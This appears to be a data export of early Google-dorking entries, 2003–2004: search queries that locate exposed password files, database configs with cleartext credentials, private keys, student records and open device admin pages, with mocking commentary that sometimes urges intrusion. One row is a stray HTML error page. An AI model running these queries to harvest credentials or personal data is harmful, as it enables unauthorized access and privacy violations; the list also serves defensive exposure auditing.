&quot;1&quot;;&quot;2003-06-24&quot;;&quot;"cacheserverreport for" "This analysis was produced by calamaris"&quot;;&quot;These are squid server cache reports. Fairly benign, really except when you consider using them for evil purposes. For example, an institution stands up a proxy server for their internal users to get to the outside world. Then, the internal user surf all over to their hearts content (including intranet pages cuz well, the admins are stupid) Voila, intranet links show up in the external cache report. Want to make matters worse for yourself as an admin? OK, configure your external proxy server as a trusted internal host. Load up your web browser, set your proxy as their proxy and surf your way into their intranet. Not that I&#039;ve noticed any examples of this in this google list. *COUGH* *COUGH* *COUGH*  unresolved DNS lookups give clues *COUGH* *COUGH* (&#039;scuse me. must be a furball) OK, lets say BEST CASE scenario. Let&#039;s say there&#039;s not security problems revealed in these logs. Best case scenario is that outsiders can see what your company/agency/workers are surfing.&quot;
&quot;12&quot;;&quot;2003-06-24&quot;;&quot;intitle:index.of mt-db-pass.cgi&quot;;&quot;These folks had the technical prowess to unpack the movable type files, but couldn&#039;t manage to set up their web servers properly. Check the mt.cfg files for interesting stuffs...&quot;
&quot;13&quot;;&quot;2003-06-24&quot;;&quot;intitle:"Welcome to Windows 2000 Internet Services"&quot;;&quot;At first glance, this search reveals even more examples of operating system users enabling the operating system default web server software. This is generally accepted to be a Bad Idea(TM) as mentioned in the previous example. However, the googleDork index on this particular category gets quite a boost from the fact that this particular screen should NEVER be seen by the general public. To quote the default index screen: "Any users attempting to connect to this site are currently receiving an &#039;Under Construction page&#039;" THIS is not the &#039;Under Construction page.&#039; I was only able to generate this screen while sitting at the console of the server. The fact that this screen is revealed to the general public may indicate a misconfiguration of a much more insidious nature...&quot;
&quot;14&quot;;&quot;2003-06-24&quot;;&quot;intitle:"Welcome to IIS 4.0"&quot;;&quot;Moving from personal, lightweight web servers into more production-ready software, we find that even administrators of Microsoft&#039;s Internet Information Server (IIS) sometimes don&#039;t have a clue what they&#039;re doing. By searching on web pages with titles of "Welcome to IIS 4.0" we find that even if they&#039;ve taken the time to change their main page, some dorks forget to change the titles of their default-installed web pages. This is an indicator that their web server is most likely running, or was upgraded from, the now considered OLD IIS 4.0 and that at least portions of their main pages are still exactly the same as they were out of the box. Conclusion? The rest of the factory-installed stuff is most likely lingering around on these servers as well. Old code: FREE with operating system.Poor content management: an average of $40/hour. Factory-installed default scripts: FREE with operating system.Getting hacked by a script kiddie that found you on Google: PRICELESS.For all the things money can&#039;t buy, there&#039;s a googleDork award.&quot;
&quot;15&quot;;&quot;2003-06-24&quot;;&quot;"Index of /backup"&quot;;&quot;Backup directories are often very interesting places to explore. More than one server has been compromised by a hacker&#039;s discovery of sensitive information contained in backup files or directories. Some of the sites in this search meant to reveal the contents of their backup directories, others did not. Think about it. What.s in YOUR backup directories? Would you care to share the contents with the whole of the online world? Probably not. Whether intentional or not, bsp.gsa.gov reveals backup directory through Google. Is this simply yet another misconfigured .gov site? You decide. BSP stands for "best security practices," winning this site the Top GoogleDork award for this category.&quot;
&quot;16&quot;;&quot;2003-06-24&quot;;&quot;"powered by openbsd" +"powered by apache"&quot;;&quot;I like the OpenBSD operating system. I really do. And I like the Apache web server software. Honestly. I admire the mettle of administrators who take the time to run quality, secure software. The problem is that you never know when security problems will pop up. A BIG security problem popped up within the OpenBSD/Apache combo back in the day.Now, every administrator that advertised this particular combo with cute little banners has a problem. Hackers can find them with Google. I go easy on these folks since the odds are they.ve patched their sites already. Then again, they may just show up on zone-h..&quot;
&quot;17&quot;;&quot;2003-06-24&quot;;&quot;intitle:index.of intext:"secring.skr"|"secring.pgp"|"secring.bak"&quot;;&quot;PGP is a great encryption technology. It keeps secrets safe. Everyone from drug lords to the head of the DEA can download PGP to encrypt their sensitive documents. Everyone, that is except googleDorks. GoogleDorks, it seems, don&#039;t understand that anyone in possession of your private keyring (secring) can get to your secret stuff. It should noever be given out, and should certainly not be posted on the Internet. The highest ranking is awarded for this surprising level of ineptitude.&quot;
&quot;18&quot;;&quot;2003-06-24&quot;;&quot;intitle:index.of people.lst&quot;;&quot;*sigh*&quot;
&quot;19&quot;;&quot;2003-06-24&quot;;&quot;intitle:index.of passwd passwd.bak&quot;;&quot;There&#039;s nothing that defines a googleDork more than getting your PASSWORDS grabbed by Google for the world to see. Truly the epitome of a googleDork. The hits in this search show "passwd" files which contain encrypted passwords which may look like this: "guest MMCHhvZ6ODgFo" A password cracker can eat cheesy hashes faster than Elvis eatin&#039; jelly doughnuts. Bravo googleDorks! Good show!&quot;
&quot;20&quot;;&quot;2003-06-24&quot;;&quot;intitle:index.of master.passwd&quot;;&quot;There&#039;s nothing that defines a googleDork more than getting your PASSWORDS grabbed by Google for the world to see. Truly the epitome of a googleDork. The hits in this search show "master.passwd" files which contain encrypted passwords which may look like this: "guest MMCHhvZ6ODgFo" A password cracker can eat cheesy hashes faster than Elvis eatin&#039; jelly doughnuts. Bravo googleDorks! Good show!For master.passwd, be sure to check other files in the same directory...&quot;
&quot;21&quot;;&quot;2003-06-24&quot;;&quot;intitle:"Index of" pwd.db&quot;;&quot;There&#039;s nothing that defines a googleDork more than getting your PASSWORDS grabbed by Google for the world to see. Truly the epitome of a googleDork. The his in this search show "pwd.db" files which contain encrypted passwords which may look like this: "guest MMCHhvZ6ODgFo" A password cracker can eat cheesy hashes faster than Elvis eatin&#039; jelly doughnuts. Bravo googleDorks! Good show!&quot;
&quot;22&quot;;&quot;2003-06-24&quot;;&quot;intitle:"Index of" ".htpasswd" htpasswd.bak&quot;;&quot;There&#039;s nothing that defines a googleDork more than getting your PASSWORDS grabbed by Google for the world to see. Truly the epitome of a googleDork. And what if the passwords are hashed? A password cracker can eat cheesy password hashes faster than Elvis eatin&#039; jelly doughnuts. Bravo googleDorks! Good show!&quot;
&quot;23&quot;;&quot;2003-06-24&quot;;&quot;intitle:"Index of" ".htpasswd" "htgroup"  -intitle:"dist" -apache -htpasswd.c&quot;;&quot;There&#039;s nothing that defines a googleDork more than getting your PASSWORDS grabbed by Google for the world to see. Truly the epitome of a googleDork. And what if the passwords are hashed? A password cracker can eat cheesy password hashes faster than Elvis eatin&#039; jelly doughnuts. Bravo googleDorks! Good show!You&#039;ll need to sift through these results a bit...&quot;
&quot;24&quot;;&quot;0000-00-00&quot;;&quot;
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
	<title>Database Error</title>

</head>
<body>
	<h1>Error establishing a database connection</h1>
<&quot;;&quot;l>
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
	<title>Database Error</title>

</head>
<body>
	<h1>Error establishing a database connection</h1>
</b&quot;
&quot;25&quot;;&quot;2003-06-24&quot;;&quot;intitle:"Index of..etc" passwd&quot;;&quot;There&#039;s nothing that defines a googleDork more than getting your PASSWORDS grabbed by Google for the world to see. Truly the epitome of a googleDork. And what if the passwords are hashed? A password cracker can eat cheesy password hashes faster than Elvis eatin&#039; jelly doughnuts. Bravo googleDorks! Good show!&quot;
&quot;26&quot;;&quot;2003-06-24&quot;;&quot;buddylist.blt&quot;;&quot;These searches bring up common names for AOL Instant Messenger "buddylists". These lists contain screen names of your "online buddies" in Instant Messenger. Not that&#039;s not too terribly exciting or stupid unless you want to mess with someone&#039;s mind, and besides, some people make these public on purpose. The thing that&#039;s interesting are the files that get stored ALONG WITH buddylists. Often this stuff includes downloaded pictures, resumes, all sorts of things. This is really for the peepers out there, and it&#039; possible to spend countless hours rifling through people&#039;s personal crap. Also try buddylist.blt, buddy.blt, buddies.blt.&quot;
&quot;27&quot;;&quot;2003-06-24&quot;;&quot;intitle:index.of config.php&quot;;&quot;This search brings up sites with "config.php" files. To skip the technical discussion, this configuration file contains both a username and a password for an SQL database. Most sites with forums run a PHP message base. This file gives you the keys to that forum, including FULL ADMIN access to the database. Way to go, googleDorks!!&quot;
&quot;28&quot;;&quot;2004-11-18&quot;;&quot;intitle:phpinfo "PHP Version"&quot;;&quot;this brings up sites with phpinfo(). There is SO much cool stuff in here that you just have to check one out for yourself! I mean full blown system versioning, SSL version, sendmail version and path, ftp, LDAP, SQL info, Apache mods, Apache env vars, *sigh* the list goes on and on! Thanks "joe!" =)&quot;
&quot;29&quot;;&quot;2003-06-24&quot;;&quot;"supplied argument is not a valid MySQL result resource"&quot;;&quot;One of many potential error messages that spew interesting information. The results of this message give you real path names inside the webserver as well as more php scripts for potential "crawling" activities.&quot;
&quot;31&quot;;&quot;2003-06-27&quot;;&quot;intitle:index.of robots.txt&quot;;&quot;The robots.txt file contains "rules" about where web spiders are allowed (and NOT allowed) to look in a website&#039;s directory structure. Without over-complicating things, this means that the robots.txt file gives a mini-roadmap of what&#039;s somewhat public and what&#039;s considered more private on a web site. Have a look at the robots.txt file itself, it contains interesting stuff.However, don&#039;t forget to check out the other files in these directories since they are usually at the top directory level of the web server!&quot;
&quot;32&quot;;&quot;2003-06-27&quot;;&quot;index.of passlist&quot;;&quot;I&#039;m not sure what uses this, but the passlist and passlist.txt files contain passwords in CLEARTEXT! That&#039;s right, no decoding/decrypting/encrypting required. How easy is this?*sigh*Supreme googledorkage&quot;
&quot;33&quot;;&quot;2003-06-27&quot;;&quot;index.of.secret&quot;;&quot;What kinds of goodies lurk in directories marked as "secret?" Find out...&quot;
&quot;34&quot;;&quot;2003-06-27&quot;;&quot;index.of.private&quot;;&quot;What kinds of things might you find in directories marked "private?" let&#039;s find out....&quot;
&quot;35&quot;;&quot;2003-06-27&quot;;&quot;index.of.etc&quot;;&quot;This search gets you access to the etc directory, where many many many types of password files can be found. This link is not as reliable, but crawling etc directories can be really fun!&quot;
&quot;36&quot;;&quot;2003-06-27&quot;;&quot;index.of.winnt&quot;;&quot;The WINNT directory is the directory that Windows NT is installed into by default. Now just because google can find them, this doesn&#039;t necessarily mean that these are Windows NT directories that made their way onto the web. However, sometimes this happens. Other times, they aren&#039;t Windows NT directories, but backup directories for Windows NT data. Wither way, worthy of a nomination.&quot;
&quot;37&quot;;&quot;2003-06-27&quot;;&quot;index.of.secure&quot;;&quot;What could be hiding in directories marked as "secure?" let&#039;s find out...&quot;
&quot;38&quot;;&quot;2003-06-27&quot;;&quot;index.of.protected&quot;;&quot;What could be in a directory marked as "protected?" Let&#039;s find out...&quot;
&quot;39&quot;;&quot;2003-06-27&quot;;&quot;index.of.password&quot;;&quot;These directories are named "password." I wonder what you might find in here. Warning: sometimes p0rn sites make directories on servers with directories named "password" and single html files inside named things liks "horny.htm" or "brittany.htm." These are to boost their search results. Don&#039;t click them (unless you want to be buried in an avalanche of p0rn...&quot;
&quot;40&quot;;&quot;2003-06-27&quot;;&quot;"This report was generated by WebLog"&quot;;&quot;These are weblog-generated statistics for web sites... A roadmap of files, referrers, errors, statistics... yummy... a schmorgasbord! =P&quot;
&quot;41&quot;;&quot;2003-06-30&quot;;&quot;"These statistics were produced by getstats"&quot;;&quot;Another web statistics package. This one originated from a google scan of an ivy league college. *sigh*There&#039;s sooo much stuff in here!&quot;
&quot;42&quot;;&quot;2003-06-30&quot;;&quot;"This summary was generated by wwwstat"&quot;;&quot;More www statistics on the web. This one is very nice.. Lots of directory info, and client access statistics, email addresses.. lots os good stuff.You know, these are SOOO dangerous, especially if INTRANET users get logged... talk about mapping out an intranet quickly...thanks, sac =)&quot;
&quot;43&quot;;&quot;2003-06-30&quot;;&quot;intitle:index.of haccess.ctl&quot;;&quot;this is the frontpage(?) equivalent of htaccess, I believe. Anyhow, this file describes who can access the directory of the web server and where the other authorization files are. nice find.&quot;
&quot;44&quot;;&quot;2003-06-30&quot;;&quot;filetype:ctl Basic&quot;;&quot;haccess.ctl is the frontpage(?) equivalent of the .htaccess file. Either way, this file decribes who can access a web page, and should not be shown to web surfers. Way to go, googledork. =PThis method is very reliable due to the use of this google query:filetype:ctl BasicThis pulls out the file by name then searches for a string inside of it (Basic) which appears in the standard template for this file.&quot;
&quot;45&quot;;&quot;2003-06-30&quot;;&quot;filetype:xls username password email&quot;;&quot;This search shows Microsoft Excel spreadsheets containing the words username, password and email. Beware that there are a ton of blank "template" forms to weed through, but you can tell from the Google summary that some of these are winners... err losers.. depending on your perspective.&quot;
&quot;46&quot;;&quot;2003-07-08&quot;;&quot;inurl:shop "Hassan Consulting&#039;s Shopping Cart Version 1.18"&quot;;&quot;These servers can be messed with in many ways. One specific way is by way of the "../" bug. This lets you cruise around the web server in a somewhat limited fashion.&quot;
&quot;47&quot;;&quot;2003-07-10&quot;;&quot;site:edu admin grades&quot;;&quot;I never really thought about this until I started coming up with juicy examples for DEFCON 11.. A few GLARINGLY bad examples contain not only student grades and names, but also social security numbers, securing the highest of all googledork ratings!&quot;
&quot;48&quot;;&quot;2003-07-11&quot;;&quot;allinurl:auth_user_file.txt&quot;;&quot;DCForum&#039;s password file. This file gives a list of (crackable) passwords, usernames and email addresses for DCForum and for DCShop (a shopping cart program(!!!). Some lists are bigger than others, all are fun, and all belong to googledorks. =)&quot;
&quot;49&quot;;&quot;2003-07-29&quot;;&quot;inurl:config.php dbuname dbpass&quot;;&quot;The old config.php script. This puppy should be held very closely. It should never be viewable to your web visitors because it contains CLEARTEXT usernames and passwords!The hishest of all googledorks ratings!&quot;
&quot;50&quot;;&quot;2003-08-07&quot;;&quot;inurl:tech-support inurl:show Cisco&quot;;&quot;This is a way to find Cisco products with an open web interface. These are generally supposed to be user and password protected. Google finds ones that aren&#039;t. Be sure to use Google&#039;s cache if you have trouble connecting. Also, there are very few results (2 at the time of posting.)&quot;
&quot;51&quot;;&quot;2003-08-11&quot;;&quot;i_index.shtml Ready&quot;;&quot;These printers are not-only web-enabled, but their management interface somehow got crawled by google! These puppies should not be public! You can really muck with these printers. In some cases, going to the "password.shtml" page, you can even lock out the admins if a username and password has not already been set! Thanks to mephisteau@yahoo.co.uk for the idea =)&quot;
&quot;52&quot;;&quot;2003-08-11&quot;;&quot;aboutprinter.shtml&quot;;&quot;More Xerox printers on the web! Google found these printers. Should their management interface be open to the WHOLE INTERNET? I think not.&quot;
&quot;53&quot;;&quot;2003-08-15&quot;;&quot;"Chatologica MetaSearch" "stack tracking:"&quot;;&quot;There is soo much crap in this error message... Apache version, CGI environment vars, path names, stack-freaking-dumps, process ID&#039;s, perl version, yadda yadda yadda...&quot;
&quot;54&quot;;&quot;2003-08-19&quot;;&quot;intitle:index.of mystuff.xml&quot;;&quot;This particular file contains web links that trillian users have entered into the tool. Trillian combines many different messaging programs into one tool. AIM, MSN, Yahoo, ICQ, IRC, etc. Although this particular file is fairly benign, check out the other files in the same directory. There is usually great stuff here!&quot;
&quot;55&quot;;&quot;2003-08-19&quot;;&quot;intitle:index.of trillian.ini&quot;;&quot;Trillian pulls together all sort of messaging clients like AIM MSN, Yahoo, IRC, ICQ, etc. The various ini files that trillian uses include files like aim.ini and msn.ini. These ini files contain encoded passwords, usernames, buddy lists, and all sorts of other fun things. Thanks for putting these on the web for us, googledorks!&quot;
&quot;56&quot;;&quot;2003-09-09&quot;;&quot;intitle:admin intitle:login&quot;;&quot;Admin Login pages. Now, the existance of this page does not necessarily mean a server is vulnerable, but it sure is handy to let Google do the discovering for you, no? Let&#039;s face it, if you&#039;re trying to hack into a web server, this is one of the more obvious places to poke.&quot;
&quot;57&quot;;&quot;2004-01-09&quot;;&quot;"ORA-00921: unexpected end of SQL command"&quot;;&quot;Another SQL error message from Cesar. This one coughs up full web pathnames and/or php filenames.&quot;
&quot;58&quot;;&quot;2004-01-23&quot;;&quot;inurl:passlist.txt&quot;;&quot;Cleartext passwords. No decryption required!&quot;
&quot;59&quot;;&quot;2004-03-04&quot;;&quot;inurl:sitebuildercontent&quot;;&quot;This is a default directory for the sitebuilder web design software program. If these people posted web pages with default sitebuilder sirectory names, I wonder what else they got wrong?&quot;
&quot;60&quot;;&quot;2004-03-04&quot;;&quot;inurl:sitebuilderfiles&quot;;&quot;This is a default directory for the sitebuilder web design software program. If these people posted web pages with default sitebuilder sirectory names, I wonder what else they got wrong?&quot;
&quot;61&quot;;&quot;2004-03-04&quot;;&quot;inurl:sitebuilderpictures&quot;;&quot;This is a default directory for the sitebuilder web design software program. If these people posted web pages with default sitebuilder sirectory names, I wonder what else they got wrong?&quot;
&quot;62&quot;;&quot;2004-03-04&quot;;&quot;filetype:htpasswd htpasswd&quot;;&quot;This is a nifty way to find htpasswd files. Htpasswd files contain usernames and crackable passwords for web pages and directories. They&#039;re supposed to be server-side, not available to web clients! *duh*&quot;
&quot;63&quot;;&quot;2004-03-04&quot;;&quot;"YaBB SE Dev Team"&quot;;&quot;Yet Another Bulletin Board (YABB) SE (versions 1.5.4 and 1.5.5 and perhaps others) contain an SQL injection vulnerability which may allow several attacks including unauthorized database modification or viewing. See http://www.securityfocus.com/bid/9674for more information. Also see http://www.securityfocus.com/bid/9677for information about an information leakage vulnerability in versions YaBB Gold - Sp 1.3.1 and others.&quot;
&quot;64&quot;;&quot;2004-03-04&quot;;&quot;inurl:custva.asp&quot;;&quot;The EarlyImpact Productcart contains multiple vulnerabilites, which could exploited to allow an attacker to steal user credentials or mount other attacks. See http://www.securityfocus.com/bid/9669 for more informationfor more information. Also see http://www.securityfocus.com/bid/9677for information about an information leakage vulnerability in versions YaBB Gold - Sp 1.3.1 and others.&quot;
&quot;65&quot;;&quot;2004-03-04&quot;;&quot;"Powered by mnoGoSearch - free web search engine software"&quot;;&quot;According to http://www.securityfocus.com/bid/9667, certain versions of mnGoSearch contain a buffer overflow vulnerability which allow an attacker to execute commands on the server.&quot;
&quot;66&quot;;&quot;2004-03-04&quot;;&quot;intitle:"the page cannot be found" inetmgr&quot;;&quot;IIS 4.0 servers. Extrememly old, incredibly easy to hack...&quot;
&quot;67&quot;;&quot;2004-03-04&quot;;&quot;intitle:"the page cannot be found" "2004 microsoft corporation"&quot;;&quot;Windows 2000 web servers. Aging, fairly easy to hack, especially out of the box...&quot;
&quot;68&quot;;&quot;2004-03-04&quot;;&quot;intitle:"the page cannot be found" "internet information services"&quot;;&quot;This query finds various types of IIS servers. This error message is fairly indicative of a somewhat unmodified IIS server, meaning it may be easier to break into...&quot;
&quot;69&quot;;&quot;2004-03-04&quot;;&quot;"# phpMyAdmin MySQL-Dump" filetype:txt&quot;;&quot;From phpmyadmin.net : "phpMyAdmin is a tool written in PHP intended to handle the administration of MySQL over the WWW." Great, easy to use, but don&#039;t leave your database dumps laying around on the web. They contain all SORTS of sensitive information...&quot;
&quot;70&quot;;&quot;2004-03-04&quot;;&quot;"# phpMyAdmin MySQL-Dump" "INSERT INTO" -"the"&quot;;&quot;From phpmyadmin.net : "phpMyAdmin is a tool written in PHP intended to handle the administration of MySQL over the WWW." Great, easy to use, but don&#039;t leave your database dumps laying around on the web. They contain all SORTS of sensitive information...&quot;
&quot;71&quot;;&quot;2004-03-04&quot;;&quot;intitle:"Gallery in Configuration mode"&quot;;&quot;Gallery is a nice little php program that allows users to post personal pictures on their website. So handy, in fact, that I use it on my site! However, the Gallery configuration mode allows outsiders to make changes to your gallery. This is why you shouldn&#039;t leave your gallery in configuration mode. These people, unfortunately, have done just that!&quot;
&quot;72&quot;;&quot;2004-03-04&quot;;&quot;intitle:index.of cgiirc.config&quot;;&quot;CGIIRC is a web-based IRC client. Very cool stuff. The cgiirc.config file lists the options for this porgram, including the default sites that can be attached to, server passwords, and crypts of admin passwords. This file is for CGIIRC, not Google surfers!&quot;
&quot;73&quot;;&quot;2004-03-04&quot;;&quot;inurl:cgiirc.config&quot;;&quot;This is another less reliable way of finding the cgiirc.config file. CGIIRC is a web-based IRC client. Very cool stuff. The cgiirc.config file lists the options for this porgram, including the default sites that can be attached to, server passwords, and crypts of admin passwords. This file is for CGIIRC, not Google surfers!&quot;
&quot;74&quot;;&quot;2004-03-04&quot;;&quot;inurl:ipsec.secrets -history -bugs&quot;;&quot;from the manpage for ipsec_secrets: "It is vital that these secrets be protected. The file should be owned by the super-user, and its permissions should be set to block all access by others." So let&#039;s make it plain: DO NOT SHOW THIS FILE TO ANYONE! Googledorks rejoice, these files are on the web!&quot;
&quot;75&quot;;&quot;2004-03-04&quot;;&quot;inurl:ipsec.secrets "holds shared secrets"&quot;;&quot;from the manpage for ipsec_secrets: "It is vital that these secrets be protected. The file should be owned by the super-user, and its permissions should be set to block all access by others." So let&#039;s make it plain: DO NOT SHOW THIS FILE TO ANYONE! Googledorks rejoice, these files are on the web!&quot;
&quot;76&quot;;&quot;2004-03-04&quot;;&quot;inurl:ipsec.conf -intitle:manpage&quot;;&quot;The ipsec.conf file could help hackers figure out what uber-secure users of freeS/WAN are protecting....&quot;
&quot;77&quot;;&quot;2004-03-04&quot;;&quot;intitle:"500 Internal Server Error" "server at"&quot;;&quot;This one shows the type of web server running on the site, and has the ability to show other information depending on how the message is internally formatted.&quot;
&quot;78&quot;;&quot;2004-03-04&quot;;&quot;"mySQL error with query"&quot;;&quot;Another error message, this appears when an SQL query bails. This is a generic mySQL message, so there&#039;s all sort of information hackers can use, depending on the actual error message...&quot;
&quot;79&quot;;&quot;2004-03-04&quot;;&quot;"You have an error in your SQL syntax near"&quot;;&quot;Another generic SQL message, this message can display path names and partial SQL code, both of which are very helpful for hackers...&quot;
&quot;81&quot;;&quot;2004-03-04&quot;;&quot;"ORA-00936: missing expression"&quot;;&quot;A generic ORACLE error message, this message can display path names, function names, filenames and partial database code, all of which are very helpful for hackers...&quot;
&quot;83&quot;;&quot;2004-03-04&quot;;&quot;"ORA-00933: SQL command not properly ended"&quot;;&quot;An Oracle error message, this message can display path names, function names, filenames and partial SQL code, all of which are very helpful for hackers...&quot;
&quot;84&quot;;&quot;2004-03-04&quot;;&quot;"Unclosed quotation mark before the character string"&quot;;&quot;An SQL Server error message, this message can display path names, function names, filenames and partial code, all of which are very helpful for hackers...&quot;
&quot;85&quot;;&quot;2004-03-04&quot;;&quot;"Incorrect syntax near"&quot;;&quot;An SQL Server error message, this message can display path names, function names, filenames and partial code, all of which are very helpful for hackers...&quot;
&quot;86&quot;;&quot;2004-03-04&quot;;&quot;"Incorrect syntax near" -the&quot;;&quot;An SQL Server error message, this message can display path names, function names, filenames and partial code, all of which are very helpful for hackers...&quot;
&quot;87&quot;;&quot;2004-03-04&quot;;&quot;"PostgreSQL query failed:  ERROR:  parser: parse error"&quot;;&quot;An PostgreSQL error message, this message can display path names, function names, filenames and partial code, all of which are very helpful for hackers...&quot;
&quot;88&quot;;&quot;2004-03-04&quot;;&quot;"Supplied argument is not a valid PostgreSQL result"&quot;;&quot;An PostgreSQL error message, this message can display path names, function names, filenames and partial code, all of which are very helpful for hackers...&quot;
&quot;89&quot;;&quot;2004-03-04&quot;;&quot;"Syntax error in query expression " -the&quot;;&quot;An Access error message, this message can display path names, function names, filenames and partial code, all of which are very helpful for hackers...&quot;
&quot;90&quot;;&quot;2004-03-04&quot;;&quot;"An illegal character has been found in the statement" -"previous message"&quot;;&quot;An Informix error message, this message can display path names, function names, filenames and partial code, all of which are very helpful for hackers...&quot;
&quot;91&quot;;&quot;2004-03-04&quot;;&quot;"A syntax error has occurred" filetype:ihtml&quot;;&quot;An Informix error message, this message can display path names, function names, filenames and partial code, all of which are very helpful for hackers&quot;
&quot;92&quot;;&quot;2004-03-04&quot;;&quot;"detected an internal error [IBM][CLI Driver][DB2/6000]"&quot;;&quot;A DB2 error message, this message can display path names, function names, filenames, partial code and program state, all of which are very helpful for hackers...&quot;
&quot;93&quot;;&quot;2004-03-04&quot;;&quot;An unexpected token "END-OF-STATEMENT" was found&quot;;&quot;A DB2 error message, this message can display path names, function names, filenames, partial code and program state, all of which are very helpful for hackers...&quot;
&quot;94&quot;;&quot;2004-03-04&quot;;&quot;intitle:"statistics of" "advanced web statistics"&quot;;&quot;the awstats program shows web statistics for web servers. This information includes who is visiting the site, what pages they visit, error codes produced, filetypes hosted on the server, number of hits, and more which can provide very interesting recon information for an attacker.&quot;
